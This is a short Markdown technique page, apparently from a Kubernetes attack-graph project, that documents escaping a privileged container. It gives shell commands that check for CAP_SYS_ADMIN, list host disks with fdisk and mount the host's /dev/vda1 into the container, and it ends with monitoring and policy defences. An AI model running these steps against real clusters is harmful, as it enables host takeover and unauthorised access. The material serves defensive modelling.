# EXPLOIT_HOST_READ

Exploit an arbitrary read from a sensitive host path mounted into the container to gain execution on the host.

## Details

TODO

## Prerequisites

Execution within a privileged container process.

See the [example pod spec](../../test/setup/test-cluster/attacks/EXPLOIT_HOST_READ_TRAVERSE.yaml).

## Checks

From within a running container, determine whether it is running with as privileged by examining capabilities:

```bash
# Check the current process' capabilities
cat /proc/self/status | grep CapEff
# CapEff: 000001ffffffffff

# Decode the capabilities (on current box or offline) and check for CAP_SYS_ADMIN
# NOTE: can install capsh via apt-get update && apt-get install libcap2-bin
capsh --decode=000001ffffffffff | grep cap_sys_admin
```

Check that the host disks are visible to our container process:

```bash
apt update && apt install fdisk
fdisk -l 
# -> /dev/vda1
```

## Exploitation

Mount the disks into the container

```bash
mkdir -p /mnt/hostfs
mount /dev/vda1 /mnt/hostfs
ls -lah /mnt/hostfs/
```

With the disk now writeable from the container, follow the steps in [EXPLOIT_HOST_WRITE](./EXPLOIT_HOST_WRITE.md#Exploitation).

## Defences

### Monitoring

+ Monitor `mount` events originating from containers

### Implement security policies

Use a pod security policy or admission controller to prevent or limit the creation of pods with a `hostPath` mount of `/` or other sensitive locations.

### Least Privilege

Avoid running containers as the root user. Specify an unprivileged user account using the `securityContext`.
